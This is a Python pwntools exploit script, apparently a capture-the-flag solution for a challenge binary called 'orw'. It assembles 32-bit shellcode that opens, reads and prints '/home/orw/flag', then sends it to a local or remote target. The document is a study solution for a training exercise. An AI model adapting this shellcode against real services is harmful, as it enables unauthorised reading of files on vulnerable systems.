#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('orw')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+66
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    sc = asm(
        """
            open:
                push 0x1010101
                xor dword ptr [esp], 0x1016660
                push 0x6c662f77
                push 0x726f2f65
                push 0x6d6f682f
                mov ebx, esp
                xor ecx, ecx
                xor edx, edx
                push 5
                pop eax
                int 0x80
            
            read:
                mov ecx, ebx
                mov ebx, eax
                mov eax, 0x3
                mov dl, 0x30
                int 0x80

            write:
                mov eax, 0x4
                mov bl, 0x1
                int 0x80
        """
    )

    io.sendafter(b":", sc)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

